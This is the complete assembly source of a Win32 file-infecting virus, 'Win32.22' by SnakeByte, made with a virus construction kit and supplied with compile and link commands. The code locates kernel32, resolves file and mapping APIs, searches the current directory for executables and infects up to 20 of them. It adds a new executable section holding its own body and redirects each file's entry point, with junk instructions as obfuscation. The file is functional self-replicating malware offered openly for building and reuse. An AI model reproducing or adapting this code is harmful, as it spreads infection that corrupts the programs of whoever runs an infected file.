              
;
;
; Win32.22 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.22
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : 22
;  Infection Type         : adding a new section 
;  API Search             : Byte Comparison Type I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 22
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
                                        ; add esp, 4
 dec esp
 add esp, 5d
 mov eax, dword ptr [esp-4]
                                        ; mov ebp, eax
 push eax
 pop ebp
 sub ebp, offset Delta
 jmp KernelSearchStart


;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 mov eax, dword ptr [esp]
                                        ; store old EIP and ImageBase
 mov edi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], edi

 mov ecx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], ecx


                                        ; round to pages
 ror eax, 16d
 shl eax, 16d
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 81828
 sub dword ptr [ebp+K32Trys], 1828d

GK1:                                    ; check for DOS-EXE Stub
 cmp dword ptr [ebp+K32Trys], 0h
 jnz GotKernelXX
 jmp NoKernel
GotKernelXX:
                                        ; check for ZM
 cmp word ptr [eax], 'ZM'
 je CheckPE

GK2:
 dec eax
 sub eax, 65535d
 dec dword ptr [ebp+K32Trys]
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
                                        ; add eax, 60
 dec eax
 add eax, 61d
 mov edx, [eax]
 add eax, -60d
 neg eax
 sub edx, eax
 neg eax
                                        ; check for EP
 cmp word ptr [edx], 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:
                                        ; check if the file is a DLL
                                        ; add edx, 22
 dec edx
 add edx, 23d
                                        ; clear ecx
 and ecx, 0
 mov cx, word ptr [edx]
 and cx, 0F000h
 cmp cx, 02000h
 je GotDLL
 jmp GK2
GotDLL:                                 ; we found a DLL file
                                        ; mov ebx, 22
 mov ebx, ( 22d xor 37d )
 xor ebx, 37d
 sub edx, ebx


KernelFound:
 mov dword ptr [ebp+KernelMZ], eax
 mov dword ptr [ebp+KernelPE], edx

 mov eax, ebp
 add eax, offset GetApis

 push eax
ret

;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 rcl ecx, 23d                           ; Trash
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
                                        ; clear edx
 and edx, 0
 mov ecx, dword ptr [ebp+AlignReg2]
 div ecx
                                        ; add eax, 1
 sub eax, -1d
 mul ecx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 push dword ptr [ebp+MapAddress]
 pop edx
                                        ; retrieve PE - Header
 mov esi, edx
 add esi, [edx+3Ch]
                                        ; get File Alignment
                                        ; add esi, 60
 inc esi
 add esi, 59d
 mov eax, [esi]
 sub esi, 60d
 mov dword ptr [ebp+filealign], eax
                                        ; clear esi
 push 0
 pop esi
 add esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov edx, dword ptr [esi+3Ch]
 add edx, esi
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 push edx
 pop dword ptr [ebp+PEheader]
                                        ; get old Entrypoint
 mov ebx, dword ptr [edx+28h]
 push ebx
 pop dword ptr [ebp+OldEIP]
 mov ecx, dword ptr [edx+34h]
 mov dword ptr [ebp+OldBase], ecx
 mov ecx, [edx+38h]
 mov dword ptr [ebp+sectionalign], -1
 and dword ptr [ebp+sectionalign], ecx
                                        ; Get last section
 mov eax, [edx+74h]
 shl eax, 3
                                        ; clear ecx
 mov ecx, 0
 mov cx, word ptr [edx+6h]
 mov ebx, 28h
 pushad
 mov eax, ecx
 mul ebx
 mov dword ptr [ebp+Misc1], eax
 popad
 mov ecx, dword ptr [ebp+Misc1]
 add edx, 78h
 add edx, eax
 add edx, ecx
 mov eax, offset newsection
 add eax, ebp


 xchg eax, edx
 push eax
                                        ; Calculate the RVA of the new section
 mov edx, [eax-5*8+8d]
 add edx, [eax-5*8+12d]
 mov ebx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], edx
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], ebx
 mov dword ptr [ebp+nsphysicalsize], edx
 Call Align
 push dword ptr [ebp+AlignReg1]
 pop edx
 mov dword ptr [ebp + offset nsRVA], edx
                                        ;  calculate the virtual size of the new section
 mov edx, dword ptr [ebp + offset sectionalign]
 push VirusSize
 pop dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+AlignReg2], -1
 and dword ptr [ebp+AlignReg2], edx
 Call Align
 push dword ptr [ebp+AlignReg1]
 pop ebx
 mov dword ptr [ebp+nsvirtualsize], ebx
                                        ; calculate physical offset
 mov ecx,[eax-5*8+20d]
 add ecx,[eax-5*8+16d]
 mov eax,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], ecx
 mov dword ptr [ebp+AlignReg2], eax
 Call Align
 mov ecx, dword ptr [ebp+AlignReg1]
 sar eax, 24d                           ; Trash
 mov dword ptr [ebp+nsphysicaloffset], ecx
                                        ; calculate new size
 mov ebx, dword ptr [ebp+filealign]
 mov edx, ecx
 add edx, VirusSize
 mov dword ptr [ebp+AlignReg2], 0
 xor dword ptr [ebp+AlignReg2], ebx
 mov dword ptr [ebp+AlignReg1], edx
 call Align
 mov edx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], edx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], edx
 call CreateMap
 jc NoEXE
 lea esi, [ebp+newsection]
 xchg esi, ebx

                                        ; mov eax, 64
 push 64d
 pop eax
 pop edx
WriteNewSectionLoop:
 mov cl, byte ptr [ebx]
 mov byte ptr [edx], cl
 add eax, -1
                                        ; add ebx, 1
 add ebx, 1d
                                        ; add edx, 1
 sub edx, -1d
 or eax, eax
 jnz WriteNewSectionLoop
                                        ; increase section numbers
                                        ; clear edx
 mov edx, -23083d
 add edx, 23083d
 xor edx, dword ptr [ebp+PEheader]
 add word ptr [edx+06h], 1
 mov eax, dword ptr [ebp+nsRVA]
 push eax
 pop dword ptr [ebp+NewEIP]
                                        ; set new EIP
 mov dword ptr  [edx+28h], eax
                                        ; set infection mark
 mov dword ptr [edx+4Ch], -1d
 and dword ptr [edx+4Ch], '22'
 mov ecx, dword ptr [ebp+nsphysicaloffset]
 push ecx
                                        ; Append Virus
 pop edi
 add edi, dword ptr [ebp+MapAddress]
 mov edx, VirusSize
 mov esi, offset Virus
 add esi, ebp


AppendLoop:
 movsb
 dec edx
 jnz AppendLoop
                                        ; decrease Infection Counter
 push dword ptr [ebp+InfCounter]
 pop ebx
 sub ebx, 1
 mov dword ptr [ebp+InfCounter], -1
 and dword ptr [ebp+InfCounter], ebx
 clc
ret

NoEXE:
 pop edx
 stc
ret



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov eax, 80000000h or 40000000h
 push eax
 lea edi, [ebp+WFD_szFileName]
 xchg ecx, edi

 push ecx
 call dword ptr [ebp+XCreateFileA]

 inc eax
 jz Closed
 sub eax, 1

 mov dword ptr [ebp+FileHandle], -1
 and dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov edx, dword ptr [ebp+WFD_nFileSizeLow]
 push edx
 push 0
 push edx
 push 0
                                        ; mov ebx, 4
 mov ebx, ( 4d + 15d )
 sub ebx, 15d
 push ebx
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop edx
 dec eax
 inc eax
 jz CloseFile
                                        ; clear ebx
 mov ebx, 0
 push edx
 push ebx
 push ebx
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 or eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret
 or ecx, ecx                            ; Trash

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; eax Lenght of API-Name
                                        ; edi Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad



 mov ecx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear ebx
 mov ebx, 19542d
 sub ebx, 19542d
 add ebx, [ecx+78h]
 add ebx, [ebp+KernelMZ]
                                        ; add ebx, 28
 add ebx, 28d
                                        ; get ATableVA
 mov ecx, dword ptr [ebx]
 add ecx, [ebp+KernelMZ]
                                        ; add ebx, 4
 add ebx, 4d
 ror edx, 29d                           ; Trash
 mov dword ptr [ebp+ATableVA], ecx
                                        ; get NTableVA
 mov ecx, dword ptr [ebx]
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], ecx
                                        ; add ebx, 4
 inc ebx
 add ebx, 3d
                                        ; get OTableVA
 mov ecx, dword ptr [ebx]
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], ecx
                                        ; clear edx
 mov edx, -35250d
 add edx, 35250d
 add edx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push edx
 mov ecx, dword ptr [edx]
 add ecx, [ebp+KernelMZ]
 adc dword ptr [ebp+Trash1], 1607331    ; Trash
                                        ; mov edx, ecx
                                        ; clear edx
 push 0
 pop edx
 add edx, ecx
                                        ; mov esi, ecx
                                        ; clear esi
 sub esi, esi
 add esi, ecx
 push eax
 mov dword ptr [ebp+TempApisearch2], esi
 mov dword ptr [ebp+TempApisearch3], edi
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; edi Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov ch, byte ptr [edi]
 cmp ch, byte ptr [esi]
 jne ApiNotFound
 dec eax
                                        ; add eax, 1
 inc eax
 sub eax, 1
 jz FoundApi1
                                        ; add esi, 1
 add esi, 1d
                                        ; add edi, 1
 inc edi
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop eax
 pop edx
 mov edi, dword ptr [ebp+TempApisearch3]
                                        ; clear esi
 push 0
 pop esi
 add esi, dword ptr [ebp+TempApisearch2]
                                        ; add edx, 4
 add edx, 4d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2001h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 pop edx
 pop edi
                                        ; retrieve the offset
                                        ; clear ebx
 xor ebx, ebx
 mov bx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 shl ebx, 1                             ; multiply with 2
 dec ecx                                ; Trash
 add ebx, dword ptr [ebp+OTableVA]
 push ebx
 pop edx
                                        ; clear ebx
 sub ebx, ebx
 mov bx, word ptr [edx]
 clc
 rcl ebx, 2h
 add ebx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 push dword ptr [ebp+KernelMZ]
 pop edx
 add edx, dword ptr [ebx]
 mov dword ptr [ebp+TempAPI], edx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edx
 popad
 jmp ExecuteHost



;                  [ ///// * Data * \\\\\ ]

Data:
 TempAPI     dd 0h
 KernelPE    dd 0h
 MapHandle   dd 0h
 db 'Virus : Win32.22 Author : SnakeByte',0
 TempApisearch3 dd 0h
 filemask    db '*.exe',0
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 MapAddress  dd 0h
 counter     dw 0h
 OldEIP      dd 0h
 OTableVA    dd 0h
 Trash1      dd 0h
 Misc1       dd 0h
 AlignReg1   dd 0h
 KernelMZ    dd 0h
 filealign   dd 0h
 sectionalign   dd 0h
 TempApisearch2 dd 0h
 Attributes  dd 0h
 NewEIP      dd 0h
 NewSize     dd 0h

 APIOffsets:
 XSetFileAttributesA    dd 0h
 XFindClose             dd 0h
 XUnmapViewOfFile       dd 0h
 XMapViewOfFile         dd 0h
 XGetFileAttributesA    dd 0h
 XCreateFileA           dd 0h
 XCloseHandle           dd 0h
 XCreateFileMappingA    dd 0h
 XFindFirstFileA        dd 0h
 XFindNextFileA         dd 0h


 OldBase     dd 400000h
 AlignReg2   dd 0h
 FindHandle  dd 0h
 ATableVA    dd 0h

 APINames:
 db 'SetFileAttributesA', 0
 db 'FindClose', 0
 db 'UnmapViewOfFile', 0
 db 'MapViewOfFile', 0
 db 'GetFileAttributesA', 0
 db 'CreateFileA', 0
 db 'CloseHandle', 0
 db 'CreateFileMappingA', 0
 db 'FindFirstFileA', 0
 db 'FindNextFileA', 0

 FileHandle  dd 0h
 InfCounter  dd 0h
 K32Trys     dd 0h
 NTableVA    dd 0h
newsection:                           ; Settings for the new section
 nsname           db '.section'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 PEheader    dd 0h




;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 xor ebx, ebx                           ; Trash
 mov ecx, ebp
 add ecx, offset WIN32_FIND_DATA

 push ecx
 push edi
 call dword ptr [ebp+XFindFirstFileA]
 push eax
 mov dword ptr [ebp+Trash1], 896718     ; Trash
 pop dword ptr [ebp+FindHandle]
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea ebx, [ebp+WIN32_FIND_DATA]
 xchg esi, ebx

 push esi
                                        ; clear edx
 mov edx, -29380d
 add edx, 29380d
 add edx, dword ptr [ebp+FindHandle]
 push edx
 call dword ptr [ebp+XFindNextFileA]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
 mov esi, offset WFD_szFileName
 add esi, ebp

                                        ; mov ebx, 276
 mov ebx, 0
 add ebx, 276d

ClearOldData2:
 mov byte ptr [esi], 0h
                                        ; add esi, 1
 sub esi, -1d
 dec ebx
 jnz ClearOldData2
 popad
ret





;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 push NumberOfApis
 pop ebx

                                        ; load API Names and Offsets
 lea ecx, [ebp+APINames]
 xchg edi, ecx

 lea edx, [ebp+APIOffsets]


GetApisLoop: 
                                        ; clear the counter
 and word ptr [ebp+counter], 0h

 push edi
 pop eax
APINameDetect:                          ; calculate the lenght of the names
 add eax, 1d
 cmp byte ptr [eax], 0
 jne APINameDetect
 sub dword ptr [ebp+Trash1], 339775     ; Trash

 push eax
 sub dword ptr [esp], edi
 pop eax
                                        ; search 'em
                                        ; eax contains Name-Lenght
                                        ; edi points to the Name
                                        ; edx points to the offset

 call SearchAPI1
 push edi
 add dword ptr [esp], eax
 pop edi
                                        ; add edi, 1
 sub edi, -1d
 mov ecx, dword ptr [ebp+TempAPI]
 mov dword ptr [edx], -1
 and dword ptr [edx], ecx
                                        ; add edx, 4
 inc edx
 add edx, 3d
 sub ebx, 1
 jnz GetApisLoop
 jmp Outbreak



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 push 20d
 pop dword ptr [ebp+InfCounter]
 lea ecx, [ebp+filemask]
 xchg edi, ecx
 sub dword ptr [ebp+Trash1], 227442     ; Trash

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 inc eax
 cmp eax, 0
 je EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 jna EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 cmp eax, 0
 jne InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 mov edx, dword ptr [ebp+FindHandle]
 push edx
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost
 sub dword ptr [ebp+Trash1], 1799189    ; Trash


;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; get and remove file attributes
 lea ebx, [ebp+WFD_szFileName]

 push ebx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
 push 80h
 mov ecx, offset WFD_szFileName
 add ecx, ebp


 push ecx
 call dword ptr [ebp+XSetFileAttributesA]
 or eax, eax
 jz NoInfection
                                        ; check for minimum filesize
 mov ebx, dword ptr [ebp+WFD_nFileSizeLow]
 cmp ebx, 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; mov edi, -1
 mov edi, ( -1d xor 33d )
 xor edi, 33d
 and edi, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [edi], 'ZM'
 je Goodfile
                                        ; mov ecx, 36133
 mov ecx, ( 36133d - 33d )
 add ecx, 33d
 test ecx, ecx
 jnz Notagoodfile
Goodfile:
                                        ; clear eax
 mov eax, -7303d
 add eax, 7303d
 mov ax, word ptr [edi+3Ch]
                                        ; add eax, 1
 sub eax, -1d
 dec eax
 jz Notagoodfile
 mov edx, dword ptr [edi+3Ch]
                                        ; check if header lies inside the file
 cmp edx, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add edx, edi
                                        ; check for PE Header
                                        ; check for EP
 movzx eax, word ptr [edx]
 sub eax, 'EP'
 jz Goodfile2
                                        ; mov eax, 19286
 mov eax, ( 19286d xor 8d )
 xor eax, 8d
 cmp eax, 19286d
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edx+4Ch], '22'
 jz Notagoodfile
                                        ; check for DLL
 mov bx, word ptr [edx+16h]
 and bx, 0F000h
 cmp bx, 02000h
 je Notagoodfile
                                        ; check for OBJ
 mov ax, word ptr [edx+16h]
 and ax, 00002h
 cmp ax, 00002h
 jne Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
 mov ecx, dword ptr [ebp+Attributes]
 push ecx
 lea ebx, [ebp+WFD_szFileName]
 xchg ecx, ebx

 push ecx
 call dword ptr [ebp+XSetFileAttributesA]
 jmp NoInfection

Notagoodfile:
 call UnMapFile
 rcl ebx, 20d                           ; Trash

NoInfection:
ret




;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov edx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], edx

 push dword ptr [ebp+OldEIP]
 pop ebx

 mov dword ptr [ebp+retEIP], -1
 and dword ptr [ebp+retEIP], ebx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 test ebp, ebp
 jz FirstGenHost
 mov eax,12345678h
 org $-4
 retBase dd 0h
 add eax,12345678h
 org $-4
 retEIP dd 0h
 push eax
ret



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

